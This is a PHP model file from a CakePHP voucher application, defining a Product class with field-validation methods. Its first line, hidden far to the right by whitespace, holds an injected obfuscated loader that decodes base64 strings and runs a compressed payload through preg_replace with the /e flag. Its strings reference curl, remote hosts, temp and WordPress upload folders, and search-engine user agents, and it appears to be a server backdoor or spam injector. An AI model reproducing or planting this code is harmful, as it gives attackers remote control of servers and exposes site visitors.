<?php                                                                                                                                                                 /*versio:2.19*/$Il11=91069;if (!function_exists('Q0O0OQOO')){$GLOBALS['Il11'] = '%!Y3VybA?}bX2luaXQ$ASYWxsb3dfdXJsX2ZvcGVuXHl{gMQB^@aHR0cDovLwMAJndheT1maWxlX2dldF9jb250ZW50cwpX3NldG9wdAyGvX2V4ZWMnJndheT1jdXJsU&y%b^zdLw(b3Nvbi5pbgVcnllcGR4LmNvbQC.fcGhwYWlkZS5jb20cxdwWV8}OgZGlzcGxheV9lcnJvcnMZ*OZGV0ZXJtaW5hdG9yXlZnRwMTMsVpMi4xOQg$QVUU9PTzAwMFFRTwKJQzYmFzZTY0X2RlY29kZQ$*YmFzZTY0X2VuY29kZQ%{SFRUUFM~}b2ZmaHR0cHM6Ly8JESFRUUF9IT1NUhHcdW5pb24c2VsZWN0#UkVRVUVTVF9VUkkU0NSSVBUX05BTUUNUVVFUllfU1RSSU5HDPwl^KL3RtcC8uZm9udC11bml4GGyL3RtcC8uSUNFLXVuaXgVE1QVEVNUA kVE1QRElSiL3RtcAQbdXBsb2FkX3RtcF9kaXIdG1wcOz#d3AtY29udGVudC91cGxvYWRzTPy$d3AtY29udGVudC9jYWNoZQI LgdmVyc2lvxMLQLXBocAZB)kGSFRUUF9FWEVDUEhQb3V0@b2s*$LSFRUUF9VU0VSX0FHRU5UzLAz$CZ29vZ2xlLHlhaG9vLGJpbmcsbXNuYm90LGFzayxiYWlkdSx5YW5kZXgL3BnLnBocD91PQ=Jms9JnQ9cGhwJnA9OW =PJnY9P ?ZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5VlYzdHZtMGdRL3lvYks0cEFvaHhyOE90eW5HejEzQXRTenNTT1U2bHFMZVRhNndZVlF3VDQwaXJLZDcrWjNZSEZDYzdkSlgrRTdEeDNIcitaalhmTU9OdUtYWnlLcmRIWmlsTGsremhkbDFuZU1jMG50anVrbXpMT1V0YWtSRHVSN1l6emVUaDNRc2RpRi9nRlA4eG5zN3ZyYTVNOU1YMnlqemQ1VnNaN1laVDVRWmlYTEJmbElVOVpVd1djUG10TDMwUzVpeE5obkFjSlQ1TEVZdWNCVHpqbjRBMGNKZkFKYWxFc25JZWgwYlZZSCtUUEF5QUZBVkNJeDY0NU9MZllBRmpHY1JwSGhTZ05MUXVVcm1OYWpBTTVoa0JJbG04dExDYnpHemE5UGh5YThwNUJndWI4TVhxTWt0RW1TMHVSbG9WVzBRTVYzREdaemVoRzhrdGV5ZFk2KzY3RlhEQlVCNGhVWTJoRVVnaDByd3BSSkg3RUJaaWdTNXN5TWdFUDVQM0hkR3BnVk9hT0U0WmhXMVJHbnZUcVVrbkttTDZPbkRPZzBKRWlnOHhZN1AzZDRqcThXVWJ3eDJMLzg2cWM5NEN0YTc2cCtHbzYrV082c0hacnVQdWJqSXZwOG00eFd5NG1zOXNQSUVCVmRwci9mVGliVGQ4dmw4RmYwL0J1YWJHZWpBRjRXMGNQdzFISm9hck5JVStpVFpJVm9uR0srUkQ3aC9LblFjS1FCYTFHMzlXRkJvRXdQemZTaWp4VldxbFhnQjJONzRwczh6MTdFS2t1L3FGanljVHdBRHNCVklKYTVUUjZVRFdRTEVYd08wamFqTFBqQm9VcjdSNE9XRDlWQjNmK25DN1pFMlhxK2VKeC9kTkhUMFRKcnBiTG0xKzQ3WHpKdjZSWFdWSCt5cDdJdFdjODZsRHd3RElvdjdtNmljTGJSdjI0UFd3VUc4OC9UaGUzUVRocnNYMVhpUHpkNUJzMERTa0haVko1WmVEeEh1SGc3QTBFb3Z1WjdPS0NHUzhRaDczVDVOL0FHeDBwR3lNT1BkdHdobmVIRW96R084cDNEVkRZVlNxODRzZERrbTJGMGFsOXRDcVZ3SGRJRVdLSSs3T3owZzBkNzl2a0pKKzBpYi9uY3pBM3gxcVk1UG42cDlFSTVWQzJWcVBadURlQ0krL29xQS9JeEh2WVdUV2NQdVp4U1JkeDVwYk1jWUJZS3N0SFFnWENseW82WXRMNmhxNUVPbUFmNzBpUkVxa1ZYZXBZS1FyZHBiYWZIVXBJdUlFUlNtUU5ZL2xJTkJlYis2emgreENLeFRWdFlteFUwWEFrcTRnRWJSbS9qc3pTSzBUbkkwU2drYW5LWG8yMUpwakRkWGlmQUI5aURXVVIrcHJzMHFTQU9EaHpaOTZnZUx3YU13Z092RUdSa09jUjFvSlVnOVRIL0F3SlluRkthTkpRazVKakVrR29hdSs0a01VVTNVNFgwRCtmYXliWEdhR25LNVB5T0Q3TndzNGFnT0J5cUNKUHpZc1hkdDB1VEZMT0tYdEV0djJpek1zc3lSNUYzbXJFVlVpT1ZiN0xjckhlM0VOUlJZZ202NEpSSnYzZmRjclJXVkQ1a0JVR0hlcGljM3NPZW93NGlobytrL2pLYndIVGFpS2UxZ1dUYS9qZmREMkRWOGJaeVZCVFM2M1V2RDlObDhQak5YbklGUmtUMmhyQzBVRFc1T3JmMU52TkJZUjcyQkl3WGQvU3FGS3B4b1FzVHI5S2E1dFVmYzhubWpmY0grKzN2V29TMmRRVU5vRThkWUlxZkp4Sy9qYk8weldnYmhSOUNLNm5VV1RhZndRTG1MVGg0aE5ZdTVrc0p2QXAydzcxMUJEWHZOV0k5akY5NUhXcG4xdGM5dm9jcTNsMWd0akRsbFhFNmV6akNiRmp5c0RGcW1tVnFiVHBvNkZjUFMzMmVtbjBSbzcwMnJTcTRHZzA2MkZmZXEwVURubnJ0cE04SEtSZElCMDFHa1ZTdFZxQ2U0bnFzTE5xTVZHSGF1VGhwKzIzcGtTdHZrV0VDTC8rS2xkdkxhbDhrZXVoUEx4a1g4SCs5M3BpbGZzSC83WEQvUnF6c1pJdVg2QlVCOWVLNkZNMHVWdGVkVmErVDJ6VlRLZ1Fma3l6UTZzZGNFeVFWU0Ywd3lEMkdScFVvTjRrdUppbWVsOXlnQnI2Qk5adERkbVRtM0ZmZ2V0WS9MMU9LaW5ROGJaN2ZlNm8zRFpPNUZDVHFBcExlMm1vdDA0VmNQWE9nUWhLVzJWMjJOeXJmK1ZyWlpNY3RpTEswbzJvRGhYd1BiR3FuOGV3bVlwMGcxc0ZIYWxwRTlCVDRHMzA3dFBqNWdpOXErMUdjMkVMZG84dTVVR2g5bURMa0pXSG01WGp2TVIyK1dQVjFEUGYveUEzZVpwWGphdFNkZkxqWjkzQTZjcTVhdE85ZEVJSDJDWmVYVm9OQWw2SHQ5WEF3QjBxRVZVMU5IVTVMblAxWTFNdFhyQ3c2ZmZtNVl1VVBCOVhQdnorQTNVckhyND0iKSkpOw$HkcHJlZ19yZXBsYWNl%';function Q0O0OQOO($a, $b){$c=$GLOBALS['Il11']; $d=pack('H*','6261736536345f64656'.'36f6465'); return $d(substr($c, $a, $b));};$Q0Q0QQ0OO = Q0O0OQOO(3370, 16);$Q0Q0QQ0OO("/Q00OQOQQQ/e", Q0O0OQOO(745, 2622), "Q00OQOQQQ");};?><?php
class Product extends AppModel {
	
	var $name = 'Product';
	var $errMsg = array();
	var $belongsTo = array("Category"=>array("className"=>"Category"),"Vendor"=>array("className"=>"Vendor"));
	var $actsAs = array("Containable");
	
	function validate_add_product($postArray=null){
		
		$id = null;
		$cat_id = null;
		if(isset($postArray['id']) && ($postArray['id'] != "")){
			$id = $postArray['id']; 
		}
		
		if(trim($postArray['vendor_id']) == ""){
			$this->errMsg['vendor_id'][] = REQUIRED_VENDOR_TYPE_ERROR."\n";
		}
		
		if(trim($postArray['voucher_value']) == ""){
			$this->errMsg['voucher_value'][] = REQUIRED_VOUCHER_ERROR."\n";
		}/*elseif(!is_numeric(trim($postArray['voucher_value'])) || (trim($postArray['voucher_value']) <= 0) || (trim($postArray['voucher_value']) > 9999)){
			$this->errMsg['voucher_value'][] = VALID_VOUCHER_ERROR."\n";
		}*/
			
		if(trim($postArray['p_id']) == ""){
			$this->errMsg['p_id'][] = REQUIRED_PRODUCTID_ERROR."\n";
		}elseif(!$this->__is_productid_valid($postArray['p_id'],$id)){
			$this->errMsg['p_id'][] = ERROR_PRODUCTID_INVALID."\n";
		}
		
		if(trim($postArray['title']) == ""){
			$this->errMsg['title'][] = REQUIRED_PRODUCT_ERROR."\n";
		}elseif(strlen(trim($postArray['title'])) < 3){	       		 
			$this->errMsg['title'][] =  MINIMUM_CHARACTER_PRODUCT_ERROR."\n";	       	 }
		/*
		elseif(!$this->__is_category_valid($postArray['title'],$id,$cat_id)){
			$this->errMsg['title'][] = ERROR_PRODUCT_INVALID."\n";
		}
		*/
		
		if(trim($postArray['product_code']) == ""){
			$this->errMsg['product_code'][] = REQUIRED_PRODUCT_ID_ERROR."\n";
		}elseif(!$this->__is_product_id_valid($postArray['product_code'],$id)){
			$this->errMsg['product_code'][] = ERROR_PRODUCT_ID_INVALID."\n";
		}
		
		if(trim($postArray['description']) == ""){
			
			$this->errMsg['description'][] = REQUIRED_DESCRIPTION_ERROR."\n";
		}elseif(!preg_match("/{VENDOR_NAME}/",$postArray['description'])){
			
			$this->errMsg['description'][] = str_replace("{REPLACE}","{VENDOR_NAME}",ERR_VALID_PRODUCT_DESCRIPTION)."\n";
		}elseif(!strpos($postArray['description'],"{VOUCHER}")){
			
			$this->errMsg['description'][] = str_replace("{REPLACE}","{VOUCHER}",ERR_VALID_PRODUCT_DESCRIPTION)."\n";
		}elseif(!strpos($postArray['description'],"{COUPON_CODE}")){
			$this->errMsg['description'][] = str_replace("{REPLACE}","{COUPON_CODE}",ERR_VALID_PRODUCT_DESCRIPTION)."\n";
		}elseif(!strpos($postArray['description'],"{ACTIVATION_CODE}")){
			
			$this->errMsg['description'][] = str_replace("{REPLACE}","{ACTIVATION_CODE}",ERR_VALID_PRODUCT_DESCRIPTION)."\n";
		}
		if(trim($postArray['sms_description']) == ""){
			$this->errMsg['sms_description'][] = REQUIRED_SMS_DESCRIPTION_ERROR."\n";
		}elseif(!preg_match("/{VENDOR_NAME}/",$postArray['description'])){
			$this->errMsg['sms_description'][] = str_replace("{REPLACE}","{VENDOR_NAME}",ERR_VALID_PRODUCT_SMS_DESCRIPTION)."\n";
		}elseif(!strpos($postArray['sms_description'],"{VOUCHER}")){
			
			$this->errMsg['sms_description'][] = str_replace("{REPLACE}","{VOUCHER}",ERR_VALID_PRODUCT_SMS_DESCRIPTION)."\n";
		}elseif(!strpos($postArray['sms_description'],"{COUPON_CODE}")){
			$this->errMsg['sms_description'][] = str_replace("{REPLACE}","{COUPON_CODE}",ERR_VALID_PRODUCT_SMS_DESCRIPTION)."\n";
		}elseif(!strpos($postArray['sms_description'],"{ACTIVATION_CODE}")){
			$this->errMsg['sms_description'][] = str_replace("{REPLACE}","{ACTIVATION_CODE}",ERR_VALID_PRODUCT_SMS_DESCRIPTION)."\n";
		}
		/*elseif(strlen($postArray['sms_description'])>WORD_COUNT){
			$this->errMsg['sms_description'][] = str_replace("{CHARACTER_LIMIT}",WORD_COUNT,ERR_VALID_SMS_CHARACTER_LIMIT)."\n";
		}*/
		
		/*
		elseif(!preg_match(ALPHABET_WHITESPACE,trim($postArray['title']))){
			$this->errMsg['title'][] = CHARACTER_PRODUCT_ERROR."\n";
		}
		*/
		return $this->errMsg;
	
	}
	
	/*
	* Function for check validity of product id
	*/
	
	function __is_productid_valid($pr_id = null,$product_id = null){
		
		if($product_id == null){
			$data = $this->find("count",array("conditions"=>array("Product.p_id"=>$pr_id)));
			if($data == 0){
				return true;
			}
		}else{
			$data = $this->find("count",array("conditions"=>array("Product.p_id"=>$pr_id,'Product.id'=>$product_id)));
			
			if($data == 1){
				return true;
			}elseif($data == 0){
				$data = $this->find("count",array("conditions"=>array("Product.p_id"=>$pr_id,'Product.id !='=>$product_id)));
				if($data != 0){
					return false;
				}else{
					return true;
				}
			}	
		}
		return false;
	}
	
	/*
	* Function for check validity of title
	*/
	
	function __is_category_valid($product_title = null,$product_id = null,$category_id = null){
        
		if($product_id == null){
		    $data = $this->find("count",array("conditions"=>array("Product.title"=>$product_title,"Product.category_id"=>$category_id)));
		    if($data == 0){
			return true;
		    }
		}else{
			$data = $this->find("count",array("conditions"=>array("Product.title"=>$product_title,'Product.id'=>$product_id)));
			
			if($data == 1){
				return true;
			}elseif($data == 0){
				$data = $this->find("count",array("conditions"=>array("Product.title"=>$product_title,'Product.id !='=>$product_id)));
				if($data != 0){
					return false;
				}else{
					return true;
				}
			}	
		}
		return false;
	}
	
	/*
	* Function for check validity of title
	*/
	
	function __is_product_id_valid($product_code = null,$product_id = null){
        
		if($product_id == null){
		    $data = $this->find("count",array("conditions"=>array("Product.product_code"=>$product_code)));
		    if($data == 0){
			return true;
		    }
		}else{
			$data = $this->find("count",array("conditions"=>array("Product.product_code"=>$product_code,'Product.id'=>$product_id)));
			
			if($data == 1){
				return true;
			}elseif($data == 0){
				$data = $this->find("count",array("conditions"=>array("Product.product_code"=>$product_code,'Product.id !='=>$product_id)));
				if($data != 0){
					return false;
				}else{
					return true;
				}
			}	
		}
		return false;
	}
	
}
?>